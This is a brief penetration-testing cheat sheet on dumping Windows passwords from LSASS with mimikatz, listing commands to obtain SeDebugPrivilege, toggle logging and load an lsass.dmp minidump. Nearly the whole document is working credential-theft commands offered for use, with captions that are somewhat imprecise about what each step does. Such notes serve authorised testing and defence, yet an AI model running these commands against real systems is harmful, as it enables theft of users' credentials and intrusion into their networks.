# Windows - Dumping Passwords from LSASS

**Must have SeDebugPrivilege**

```
mimikatz# privilege::debug
Privilege '20' OK
```

Checking if debug levels are correct

```
mimikatz# log <log_file>
Using 'log_file' for logfile : OK

mimikatz# log /stop
```

Turning on logging to output to file (Starting and stopping)

```
mimikatz# sekurlsa::minidump lsass.dmp
```

Dumping password from lsass dump

**References:**
* https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa
